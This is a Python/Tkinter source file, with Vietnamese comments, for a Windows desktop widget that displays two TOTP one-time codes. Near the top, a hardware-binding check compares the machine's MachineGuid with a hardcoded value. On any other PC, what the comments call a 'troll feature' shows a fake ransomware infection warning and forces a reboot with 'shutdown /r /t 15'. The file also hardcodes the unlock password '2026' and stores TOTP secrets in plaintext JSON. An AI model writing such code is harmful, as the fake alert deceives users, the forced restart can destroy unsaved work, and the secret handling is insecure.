import tkinter as tk
from tkinter import messagebox
import hmac, base64, struct, hashlib, time, os, sys, json, threading
import winreg
from PIL import Image, ImageDraw
import pystray

# --- CẤU HÌNH ĐƯỜNG DẪN ---
APP_DIR = r"C:\Users\thietbingoaiquang\Desktop\app"
CONFIG_FILE = os.path.join(APP_DIR, "config.json")

# =======================================================
# 1. KHÓA CỨNG PHẦN CỨNG (HARDWARE BINDING)
# Thay chuỗi bên dưới bằng MachineGuid của máy tính ĐƯỢC PHÉP CHẠY
# =======================================================
ALLOWED_PC_HWID = "DÁN-MÃ-MACHINE-GUID-CỦA-MÁY-CÔNG-TY-VÀO-ĐÂY"

def get_hwid():
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
            machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            return machine_guid
    except Exception:
        return "UNKNOWN_HWID"

# =======================================================
# 2. KIỂM TRA BẢO MẬT TỨC THÌ (TÍNH NĂNG TROLL)
# =======================================================
if get_hwid() != ALLOWED_PC_HWID:
    temp_root = tk.Tk()
    temp_root.withdraw() # Ẩn cửa sổ nền
    
    # Hiện thông báo dọa virus
    messagebox.showwarning(
        "TRÌNH QUÉT HỆ THỐNG", 
        "CẢNH BÁO NGUY HIỂM: Máy tính của bạn đã bị dính vi-rút mã độc mã hóa dữ liệu!\n\n"
        "Hệ thống sẽ tự động Khởi động lại (Reset) sau 15 giây để tiến hành cách ly và quét virus."
    )
    
    # Kích hoạt lệnh Reset máy của Windows
    os.system('shutdown /r /t 15 /c "Canh bao: May tinh nhiem virus. Dang tu dong khoi dong lai de quet!"')
    
    # Tự sát phần mềm ngay lập tức
    sys.exit() 

# =======================================================
# 3. GIAO DIỆN VÀ TÍNH NĂNG CHÍNH CỦA WIDGET
# =======================================================

COLORS = ["#00ff00", "#00ffff", "#ffff00", "#ff9900", "#ff00ff", "#ffffff", "#00bfff", "#ff3333"]
OTP_FONT = ("Segoe UI", 28, "bold")

# Biến toàn cục
SECRET = ""
SECRET2 = ""  
LOCKED = False
AUTO_START = False
COLOR_INDEX = 0
UNLOCK_PASSWORD = "2026" 
IS_MINIMIZED = False
tray_icon = None
last_remaining = -1

# Bộ đếm Double Click
click_count = 0
click_lock = threading.Lock()

def load_config():
    global SECRET, SECRET2, LOCKED, AUTO_START, COLOR_INDEX
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                SECRET = data.get("secret", "")
                SECRET2 = data.get("secret2", "")
                LOCKED = data.get("locked", False)
                AUTO_START = data.get("auto_start", False)
                COLOR_INDEX = data.get("color_index", 0)
        except Exception:
            pass

def save_config():
    os.makedirs(APP_DIR, exist_ok=True)
    data = {"secret": SECRET, "secret2": SECRET2, "locked": LOCKED, "auto_start": AUTO_START, "color_index": COLOR_INDEX}
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f)

def set_autostart(enable):
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_path = os.path.join(startup_dir, "DesktopOTPWidget.bat")
    try:
        if enable:
            with open(bat_path, "w", encoding="utf-8") as f:
                f.write(f'@echo off\nstart "" "{exe_path}"')
        elif os.path.exists(bat_path):
            os.remove(bat_path)
    except Exception:
        pass

load_config()

# --- HÀM TÍNH TOÁN OTP DÙNG CHUNG ---
def calc_otp(sec, curr_time):
    if not sec: return "NO KEY", ""
    try:
        secret_cl = sec.replace(' ', '').upper()
        secret_cl += '=' * ((8 - len(secret_cl) % 8) % 8)
        key = base64.b32decode(secret_cl)
        msg = struct.pack(">Q", int(curr_time // 30))
        h = hmac.new(key, msg, hashlib.sha1).digest()
        o = h[19] & 15
        code = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
        otp_raw = f"{code:06d}"
        return f"{otp_raw[:3]} {otp_raw[3:]}", otp_raw
    except Exception:
        return "ERROR!", ""

# --- VÒNG LẶP GIAO DIỆN CHÍNH ---
def update_ui_loop():
    global last_remaining, tray_icon
    
    current_time = time.time()
    
    disp1, raw1 = calc_otp(SECRET, current_time)
    disp2, raw2 = calc_otp(SECRET2, current_time) if SECRET2 else ("--- ---", "")

    label_otp1.config(text=disp1, font=OTP_FONT)
    label_otp2.config(text=disp2, font=OTP_FONT)

    rem_exact = 30.0 - (current_time % 30.0)
    rem_int = int(rem_exact)

    if rem_int != last_remaining:
        last_remaining = rem_int
        if IS_MINIMIZED and tray_icon is not None:
            t_str = f"1: {raw1}" if raw1 else "NO KEY"
            if raw2: t_str += f" | 2: {raw2}"
            t_str += f" ({rem_int}s)"
            try:
                tray_icon.title = t_str
            except: pass

    if rem_exact <= 5.0:
        ms = int(current_time * 4)
        bar_color = "#ff3333" if ms % 2 == 0 else "black"
    else:
        bar_color = COLORS[COLOR_INDEX]

    bar_width = max(0, int(130 * (rem_exact / 30.0))) 

    if raw1 != "":
        progress_canvas1.coords(progress_bar1, 0, 0, bar_width, 4)
        progress_canvas1.itemconfig(progress_bar1, fill=bar_color)
    else:
        progress_canvas1.itemconfig(progress_bar1, fill="black")

    if raw2 != "":
        progress_canvas2.coords(progress_bar2, 0, 0, bar_width, 4)
        progress_canvas2.itemconfig(progress_bar2, fill=bar_color)
    else:
        progress_canvas2.itemconfig(progress_bar2, fill="black")

    if not IS_MINIMIZED:
        root.lower()
        
    root.after(100, update_ui_loop)

# --- XỬ LÝ KHAY HỆ THỐNG VÀ DOUBLE CLICK ---
def create_tray_image():
    image = Image.new('RGB', (64, 64), color='black')
    dc = ImageDraw.Draw(image)
    dc.rectangle((16, 16, 48, 48), fill=COLORS[COLOR_INDEX])
    return image

def check_double_click(icon):
    global click_count, IS_MINIMIZED, tray_icon, LOCKED
    with click_lock:
        if click_count >= 2:
            icon.stop()
            tray_icon = None
            IS_MINIMIZED = False
            LOCKED = True 
            root.after(0, update_lock_ui)
            root.after(0, save_config)
            root.after(0, root.deiconify)
            root.after(0, root.lower)
        click_count = 0

def restore_from_tray(icon, item):
    global click_count
    with click_lock:
        click_count += 1
        if click_count == 1:
            threading.Timer(0.35, check_double_click, args=[icon]).start()

def prompt_exit_from_tray(icon, item):
    root.after(0, show_tray_exit_prompt)

def show_tray_exit_prompt():
    exit_win = tk.Toplevel(root)
    exit_win.title("Xác nhận Thoát")
    exit_win.geometry("220x110")
    exit_win.attributes('-topmost', True)
    
    tk.Label(exit_win, text="Nhập mật khẩu để thoát hoàn toàn:").pack(pady=5)
    entry_pw = tk.Entry(exit_win, show="*", width=20, justify='center')
    entry_pw.pack(pady=5)
    entry_pw.focus()
    
    lbl_error = tk.Label(exit_win, text="", fg="red")
    lbl_error.pack()
    
    def check_pw(event=None):
        if entry_pw.get() == UNLOCK_PASSWORD:
            if tray_icon is not None: tray_icon.stop()
            root.destroy()
        else:
            lbl_error.config(text="Sai mật khẩu!")
            entry_pw.delete(0, tk.END)
            
    tk.Button(exit_win, text="Thoát App", command=check_pw, bg="#ff4444", fg="white").place(x=75, y=80)
    exit_win.bind('<Return>', check_pw)

def minimize_app(event=None):
    if LOCKED: return
    global IS_MINIMIZED, tray_icon
    IS_MINIMIZED = True
    root.withdraw()
    
    menu = pystray.Menu(
        pystray.MenuItem('Mở lại Widget', restore_from_tray, default=True, visible=False),
        pystray.MenuItem('Thoát hoàn toàn', prompt_exit_from_tray)
    )
    tray_icon = pystray.Icon("OTP_Widget", create_tray_image(), "Đang tạo mã...", menu)
    threading.Thread(target=tray_icon.run, daemon=True).start()

# --- XỬ LÝ MÀU SẮC & KHÓA ---
def cycle_color(event=None):
    if LOCKED: return
    global COLOR_INDEX
    COLOR_INDEX = (COLOR_INDEX + 1) % len(COLORS)
    label_otp1.config(fg=COLORS[COLOR_INDEX])
    label_otp2.config(fg=COLORS[COLOR_INDEX])
    save_config()

def update_lock_ui():
    btn_lock.config(text="🔒" if LOCKED else "🔓", fg="#ff4444" if LOCKED else "#aaaaaa")

def toggle_lock(event=None):
    global LOCKED
    if not LOCKED:
        LOCKED = True
        update_lock_ui()
        save_config()
    else:
        prompt_unlock()

def prompt_unlock():
    unlock_win = tk.Toplevel(root)
    unlock_win.title("Mở Khóa Widget")
    unlock_win.geometry("220x110")
    unlock_win.attributes('-topmost', True)
    
    tk.Label(unlock_win, text="Nhập mật khẩu để mở khóa:").pack(pady=5)
    entry_pw = tk.Entry(unlock_win, show="*", width=20, justify='center')
    entry_pw.pack(pady=5)
    entry_pw.focus()
    
    lbl_error = tk.Label(unlock_win, text="", fg="red")
    lbl_error.pack()
    
    def check_pw(event=None):
        global LOCKED
        if entry_pw.get() == UNLOCK_PASSWORD:
            LOCKED = False
            update_lock_ui()
            save_config()
            unlock_win.destroy()
        else:
            lbl_error.config(text="Sai mật khẩu!")
            entry_pw.delete(0, tk.END)
            
    tk.Button(unlock_win, text="Mở Khóa", command=check_pw, bg="#aaaaaa", fg="black").place(x=80, y=80)
    unlock_win.bind('<Return>', check_pw)

# --- XỬ LÝ CÀI ĐẶT ---
def open_settings(event=None):
    if LOCKED: return 
    settings_win = tk.Toplevel(root)
    settings_win.title("Cài Đặt OTP")
    settings_win.geometry("300x220") 
    settings_win.attributes('-topmost', True)
    
    tk.Label(settings_win, text="Secret Key 1 (Trái):").pack(pady=(10, 0))
    entry_secret1 = tk.Entry(settings_win, width=35)
    entry_secret1.insert(0, SECRET)
    entry_secret1.pack(pady=2)

    tk.Label(settings_win, text="Secret Key 2 (Phải):").pack(pady=(5, 0))
    entry_secret2 = tk.Entry(settings_win, width=35)
    entry_secret2.insert(0, SECRET2)
    entry_secret2.pack(pady=2)
    
    var_autostart = tk.BooleanVar(value=AUTO_START)
    chk_autostart = tk.Checkbutton(settings_win, text="Khởi động cùng Windows", variable=var_autostart)
    chk_autostart.pack(pady=5)
    
    def save_and_close():
        global SECRET, SECRET2, AUTO_START
        SECRET = entry_secret1.get().strip()
        SECRET2 = entry_secret2.get().strip()
        AUTO_START = var_autostart.get()
        save_config()
        set_autostart(AUTO_START)
        settings_win.destroy()
        
    tk.Button(settings_win, text="Lưu Cấu Hình", command=save_and_close, bg="#00ff00", fg="black").pack(pady=5)

# --- XỬ LÝ KÉO THẢ & THOÁT NGOÀI DESKTOP ---
def start_move(event):
    if LOCKED: return
    root.x = event.x
    root.y = event.y

def stop_move(event):
    if LOCKED: return
    root.x = None
    root.y = None

def do_move(event):
    if LOCKED: return
    deltax = event.x - root.x
    deltay = event.y - root.y
    x = root.winfo_x() + deltax
    y = root.winfo_y() + deltay
    root.geometry(f"+{x}+{y}")

def exit_app(event=None):
    if not LOCKED:
        root.destroy()

# --- THIẾT LẬP WIDGET ĐỐI XỨNG ---
root = tk.Tk()
root.geometry("350x70+100+100") 
root.overrideredirect(True) 

root.configure(bg='black')
root.wm_attributes("-transparentcolor", "black")
root.lower()
root.bind("<FocusIn>", lambda e: root.lower() if not IS_MINIMIZED else None) 

root.bind("<ButtonPress-1>", start_move)
root.bind("<ButtonRelease-1>", stop_move)
root.bind("<B1-Motion>", do_move)

label_otp1 = tk.Label(root, text="--- ---", font=OTP_FONT, fg=COLORS[COLOR_INDEX], bg="black")
label_otp1.place(x=5, y=-2)

progress_canvas1 = tk.Canvas(root, width=130, height=4, bg="black", highlightthickness=0)
progress_canvas1.place(x=5, y=52)
progress_bar1 = progress_canvas1.create_rectangle(0, 0, 130, 4, fill=COLORS[COLOR_INDEX], outline="")

label_otp2 = tk.Label(root, text="--- ---", font=OTP_FONT, fg=COLORS[COLOR_INDEX], bg="black")
label_otp2.place(x=215, y=-2)

progress_canvas2 = tk.Canvas(root, width=130, height=4, bg="black", highlightthickness=0)
progress_canvas2.place(x=215, y=52)
progress_bar2 = progress_canvas2.create_rectangle(0, 0, 130, 4, fill=COLORS[COLOR_INDEX], outline="")

for widget in [label_otp1, label_otp2, progress_canvas1, progress_canvas2]:
    widget.bind("<Double-Button-1>", exit_app)
    widget.bind("<ButtonPress-1>", start_move)

btn_settings = tk.Label(root, text="⚙", font=("Segoe UI", 12), fg="#aaaaaa", bg="black", cursor="hand2")
btn_settings.place(x=145, y=5, width=28, height=28)
btn_settings.bind("<Button-1>", open_settings)

btn_color = tk.Label(root, text="🎨", font=("Segoe UI", 11), fg="#aaaaaa", bg="black", cursor="hand2")
btn_color.place(x=177, y=5, width=28, height=28)
btn_color.bind("<Button-1>", cycle_color)

btn_lock = tk.Label(root, text="🔒" if LOCKED else "🔓", font=("Segoe UI", 11), fg="#ff4444" if LOCKED else "#aaaaaa", bg="black", cursor="hand2")
btn_lock.place(x=145, y=36, width=28, height=28)
btn_lock.bind("<Button-1>", toggle_lock)

btn_minimize = tk.Label(root, text="▼", font=("Segoe UI", 12), fg="#aaaaaa", bg="black", cursor="hand2")
btn_minimize.place(x=177, y=36, width=28, height=28)
btn_minimize.bind("<Button-1>", minimize_app)

update_ui_loop() 
root.mainloop()
